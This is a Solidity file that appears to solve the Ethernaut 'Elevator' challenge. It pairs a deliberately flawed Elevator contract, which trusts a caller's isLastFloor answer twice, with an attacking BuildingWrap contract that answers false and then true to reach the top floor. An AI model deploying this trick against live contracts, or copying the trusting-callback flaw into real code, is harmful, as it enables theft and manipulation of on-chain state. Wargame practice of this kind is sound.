// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface ElevatorI {
  function goTo(uint _floor) external;
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract BuildingWrap is Building {

   uint public floor = 0;

   function setFLoor(uint _floor) public {
     floor = _floor;
   }
 
  function isLastFloor(uint _floor) public override returns(bool) {
    bool res =  _floor == floor;
    floor++;
    return res;
  }

  function goToTop(address _add) public{
    ElevatorI elevator = ElevatorI(_add);
    elevator.goTo(1);
  }

  
}
